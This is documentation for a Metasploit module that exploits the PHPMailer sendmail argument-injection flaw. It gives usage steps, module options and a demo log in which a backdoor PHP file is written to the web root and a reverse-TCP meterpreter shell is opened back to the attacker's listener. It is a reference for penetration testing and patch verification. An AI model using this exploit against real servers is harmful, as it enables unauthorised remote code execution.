## Vulnerable Application

PHPMailer versions up to and including [5.2.20](https://github.com/PHPMailer/PHPMailer/archive/v5.2.20.tar.gz) are affected by a vulnerability which can be leveraged by an attacker to
write a file with partially controlled contents to an arbitrary location through injection of arguments that are passed
to the sendmail binary. This module writes a payload to the web root of the webserver before then executing it with an
HTTP request. The user running PHPMailer must have write access to the specified WEB_ROOT directory and successful
exploitation can take a few minutes.

[5.1.18](https://github.com/PHPMailer/PHPMailer/archive/v5.2.18.tar.gz) is also targeted.

## Verification Steps

  1. Install a vulnerable PHPMailer
  2. Start msfconsole
  3. `use exploit/multi/http/phpmailer_arg_injection`
  4.  Set the TARGETURI and WEB_ROOT options as applicable
  5. `exploit`
  6.  Verify the module yields a PHP meterpreter session in < 5 minutes
  7.  Verify the malicious PHP file was automatically removed

## Options

### WAIT_TIMEOUT
Seconds to wait to trigger the payload
### NameField
Name of the element for the Name field
### EmailField
Name of the element for the Email field
### MessageField
Name of the element for the Message field

## Scenarios

  Demo taken directly from [PR7768](https://github.com/rapid7/metasploit-framework/pull/7768)

```
msf (S:0 J:0) exploit(php_mailer) > options

Module options (exploit/linux/http/php_mailer):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST       192.168.90.134   yes       The target address
   RPORT       8080             yes       The target port
   SSL         false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI   /                yes       Path to the application root
   TRIGGERURI                   no        Path to the uploaded payload
   VHOST                        no        HTTP server virtual host
   WEB_ROOT    /www             yes       Path to the web root



Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.90.134   yes       The listen address
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



msf (S:0 J:0) exploit(php_mailer) > rexploit
[*] Reloading module...

[*] [2016.12.29-17:03:47] Started reverse TCP handler on 192.168.90.134:4444
[*] [2016.12.29-17:03:47] Writing the backdoor to /www/0IxI5AFB.php
[*] [2016.12.29-17:04:07] Sleeping before requesting the written file
[*] [2016.12.29-17:04:07] Waiting for up to 300 seconds to trigger the payload
[+] [2016.12.29-17:04:48] Successfully found the payload
[*] [2016.12.29-17:05:50] Sending stage (34122 bytes) to 172.17.0.2
[*] Meterpreter session 4 opened (192.168.90.134:4444 -> 172.17.0.2:47280) at 2016-12-29 17:05:50 -0500
[+] [2016.12.29-17:05:50] Deleted /www/0IxI5AFB.php
[+] [2016.12.29-17:06:10] Successfully triggered the payload


meterpreter > sysinfo
Computer    : 90f0c8e8dbe4
OS          : Linux 90f0c8e8dbe4 4.8.15-200.fc24.x86_64 #1 SMP Thu Dec 15 23:09:22 UTC 2016 x86_64
Meterpreter : php/linux

meterpreter >
```
